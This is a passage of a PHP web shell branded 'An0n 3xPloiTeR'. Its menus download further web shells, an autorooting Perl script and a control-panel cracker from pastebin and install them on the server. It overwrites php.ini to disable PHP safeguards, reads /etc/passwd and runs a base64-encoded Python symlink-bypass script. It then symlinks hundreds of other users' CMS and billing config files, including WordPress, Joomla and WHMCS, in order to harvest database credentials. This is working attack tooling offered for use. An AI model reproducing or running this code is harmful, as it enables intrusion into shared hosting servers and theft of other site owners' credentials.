					<input type = "submit" name="blackhat" value ="BlackHat Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="imageshell" value ="An0n 3xPloiTeR Image Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="madspot" value ="Madspot Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="pcd" value ="Pak Cyber Defenders Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="cheta" value ="Kashimiri Cheetah Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="1337worm" value ="1337 Worm Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="b374k" value ="b374k Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="joker" value ="Joker Shell"></td></tr></div>
				<?php
				}
		?>

		<?php
			if (isset($_GET['scripts'])) {
				?>
				<center><br><font style="color: red; font-family: cursive; font-size: 200%;">Scripts By An0n 3xPloiTeR</font>
					</center><div class="content">
					<br>
					<table border="1%" align="center" cellpadding="10">
					<tr>
					<td><font style="color: teal; font-family: cursive; font-size: 120%;">Click And Get The Scripts</font></td>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="symlink" value ="Symlinker"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="anoncmd" value ="AnonGhosts Console"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="madleets" value ="Madleets Console"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="rooter" value ="Autorooting Perl Script"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="cpc" value ="Control Panel Cracker"></td></tr></div>
				<?php

			}
		?>

		<?php

			function download($file_url, $save_to) {
        			$content = file_get_contents($file_url);
					file_put_contents($save_to, $content);
				}

		if (isset($_POST['dhanush'])) {
        download('http://pastebin.com/raw/FHs6uGki', realpath("./") . '/dhanush.php');
        header("location:dhanush.php");		} 

	if (isset($_POST['symlink'])) {
		download('http://pastebin.com/raw/hYGVf4qT', realpath("./") . '/symlink.php');
        header("location:symlink.php");		} 

    if (isset($_POST['madleets'])) {
		download('http://pastebin.com/raw/M9mx5j4h', realpath("./") . '/madleets.php');
        header("location:madleets.php");		} 

    if (isset($_POST['rooter'])) {
		download('http://pastebin.com/raw/sJxiRZAH', realpath("./") . '/rooter.php');
        header("location:rooter.php");		} 

    if (isset($_POST['cpc'])) {
		download('http://pastebin.com/raw/d73HhXBk', realpath("./") . '/cpc.php');
        header("location:cpc.php");		} 

	if (isset($_POST['anonghosts'])) {
		download('http://pastebin.com/raw/Cm3WsQXL', realpath("./") . '/anonghosts.php');
        header("location:anonghosts.php");		}

	if (isset($_POST['blackhat'])) {
		download('http://pastebin.com/raw/XFs2pPBM', realpath("./") . '/blackhat.php');
        header("location:blackhat.php");		} 

	if (isset($_POST['imageshell'])) {
		download('http://pastebin.com/raw/eTbTMB4y', realpath("./") . '/imageshell.php');
        header("location:imageshell.php");		} 

	if (isset($_POST['madspot'])) {
		download('http://pastebin.com/raw/mjKJRfXA', realpath("./") . '/madspot.php');
        header("location:madspot.php");		} 

    if (isset($_POST['pcd'])) { 
		download('http://pastebin.com/raw/cBiiU6MR', realpath("./") . '/pcd.php');
        header("location:pcd.php");		} 

    if (isset($_POST['cheta'])) { 
		download('http://pastebin.com/raw/H6ah5rnF', realpath("./") . '/cheta.php');
        header("location:cheta.php");		}


    if (isset($_POST['1337worm'])) { 
		download('http://pastebin.com/raw/7WwNgWHh', realpath("./") . '/1337worm.php');
        header("location:1337worm.php");		} 


    if (isset($_POST['joker']	)) { 
		download('http://pastebin.com/raw/eLT2PtZN', realpath("./") . '/joker.php');
        header("location:joker.php");		} 


    if (isset($_POST['b374k'])) { 
		download('http://pastebin.com/raw/UZuF1RKJ', realpath("./") . '/b374k.php');
        header("location:b374k.php");		}
		?>


		<?php
			if (isset($_GET['symlink'])) {
				$fp = fopen("php.ini", "w+");
				fwrite($fp, "safe_mode = OFF
					Safe_mode_gid = OFF
					disable_functions = NONE
					disable_classes = NONE
					open_basedir = OFF
					suhosin.executor.func.blacklist = NONE ");
				fclose($fp);
				if (empty($_POST['config'])) { ?><form method="POST"><textarea name="passwd" style="display:none;" class='area' rows='25' cols='80'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><center><br><font style="color: red; font-family: cursive; font-size: 200%;">An0n 3xPloiTeR   && AkDk Symlinker<br><br></font><br><input name="config" value="Php Symlinking" type="submit">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" name="psymlink" value="Python Symlinking"><br></form></center><br>
				<?php
}

if (isset($_POST['psymlink'])) {
	$psymlink = "Iy8qUHl0aG9uCgppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcmUKCm9zLnN5c3RlbSgiY29sb3IgQyIpCgpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIgpmID0gIkFsbCBQcm9jZXNzZXMgRG9uZSFcblN5bWxpbmsgQnlwYXNzZWQgU3VjY2Vzc2Z1bGx5IVxuIgpwcmludCAiXG4iCnByaW50ICJTeW1saW5rIEJ5cGFzcyAyMDE0IGJ5IGhBeE9yIHRyMGpBbiogXG4iCnByaW50ICIgICAgICAgICAgICAgIFNwZWNpYWwgR3JlZXR6IHRvIDogTWF1cml0YW5pYSBBdHRhY2tlciAmIHZJcmtJZCIKCm9zLm1ha2VkaXJzKCdzeW1saW5rJykKb3MuY2hkaXIoJ3N5bWxpbmsnKQoKc3Vzcj1bXQpzaXRleD1bXQpvcy5zeXN0ZW0oImxuIC1zIC8gdHIudHh0IikKCmggPSAiT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzXG5EaXJlY3RvcnlJbmRleCB0ci5waHRtbFxuQWRkVHlwZSB0eHQgLnBocFxuQWRkSGFuZGxlciB0eHQgLnBocCIKbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikKbS53cml0ZShoKQptLmNsb3NlKCkKcHJpbnQgaHRhCgpzZiA9ICI8aHRtbD48dGl0bGU+U3ltbGluayBCeXBhc3MgMjAxNCBieSBoQXhPciB0cjBqQW4qPC90aXRsZT48Y2VudGVyPjxmb250IGNvbG9yPWJsYWNrIHNpemU9NT5TeW1saW5rIEJ5cGFzcyAyMDE0PGJyPjxmb250IHNpemU9ND5NYWRlIEJ5IGhBeE9yIHRyMGpBbiogPGJyPklkZWEgQnkgTWF1cml0YW5pYSBBdHRhY2tlciAmIHZJcmtJRDwvZm9udD48L2ZvbnQ+PGJyPjxmb250IGNvbG9yPWJsYWNrIHNpemU9Mz48dGFibGU+IgoKbyA9IG9wZW4oJy9ldGMvcGFzc3dkJywncicpCm89by5yZWFkKCkKbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykKCmZvciB4dXNyIGluIG86Cgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykKCXN1c3IuYXBwZW5kKHh1c3IpCnByaW50ICItIiozMAp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQoKZm9yIHh4c2l0ZSBpbiB4c2l0ZToKCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikKCXNpdGV4LmFwcGVuZCh4eHNpdGUpCnByaW50IGYKcGF0aD1vcy5nZXRjd2QoKQppZiAiL3B1YmxpY19odG1sLyIgaW4gcGF0aDoKCXBhdGg9Ii9wdWJsaWNfaHRtbC8iCmVsc2U6CglwYXRoID0gIi9odG1sLyIKY291bnRlcj0xCmlwcz1vcGVuKCJ0ci5waHRtbCIsInciKQppcHMud3JpdGUoc2YpCgpmb3IgZnVzciBpbiBzdXNyOgoJZm9yIGZzaXRlIGluIHNpdGV4OgoJCWZ1PWZ1c3JbMDo1XQoJCXM9ZnNpdGVbMDo1XQoJCWlmIGZ1PT1zOgoJCQlpcHMud3JpdGUoIjx0cj48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOmJsYWNrOz4lczwvdGQ+PHRkIHN0eWxlPWZvbnQtZmFtaWx5OmNhbGlicmk7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjpyZWQ7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkOz48YSBocmVmPXRyLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkKCQkJY291bnRlcj1jb3VudGVyKzE=";
	$ufff = fopen("sym.py", "w");
	@fwrite($ufff, base64_decode($psymlink));
	@fclose($ufff);
	echo '<center><span style="color: white; font-family:cursive; font-size: 120%;">';
	@system("python sym.py");
	echo '<br><br><a href="symlink" target="_blank"><span style="color: red;">Click Here</span></a>'; echo '</span></center>';
}

if ($_POST['config']) {

	$php_ini_content = "c2FmZV9tb2RlID0gT0ZGCglTYWZlX21vZGVfZ2lkID0gT0ZGCglkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUKCWRpc2FibGVfY2xhc3NlcyA9IE5PTkUKCW9wZW5fYmFzZWRpciA9IE9GRgoJc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkUg";
    $php_ini = fopen("php.ini", "w");
    fwrite($php_ini, base64_decode($php_ini_content));
    fclose($php_ini);
    $function = $functions = @ini_get("disable_functions");
    if (eregi("symlink", $functions)) {
        die('<error>Symlink is disabled :( </error>');
    } else {
    @mkdir('UeXploiT', 777);
    @chdir('UeXploiT');
                $htaccess = "
Options all 
	 DirectoryIndex Sux.html 
	 AddType text/plain .php 
	 AddHandler server-parsed .php 
	  AddType text/plain .html 
	 AddHandler txt .html 
	 Require None 
	 Satisfy Any 	
";
        file_put_contents(".htaccess", $htaccess, FILE_APPEND);
    $passwd = $_POST["passwd"];
    $passwd = explode("
", $passwd);
    foreach ($passwd as $pwd) {
        $pawd = explode(":", $pwd);
        $user = $pawd[0];
@symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
@symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/db.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/connection.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home2/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home2/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home2/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home2/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home2/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home2/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home2/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home2/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home2/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home2/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home2/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home2/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home2/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home2/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home2/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home2/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home2/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home2/' . $user . '/public_html/home2/wp-config.php', $user . '-wp-home2.txt');
@symlink('/home2/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home2/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home2/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home2/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home2/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home2/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home2/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home2/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home2/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home2/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home2/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home2/' . $user . '/public_html/home2/configuration.php', $user . '-joomla-home2.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home2/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home2/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home2/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home2/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home2/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home2/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home2/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home2/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home2/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home2/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home2/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home2/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home2/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home2/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home2/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home2/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home2/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home2/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home2/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home2/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home2/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home2/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
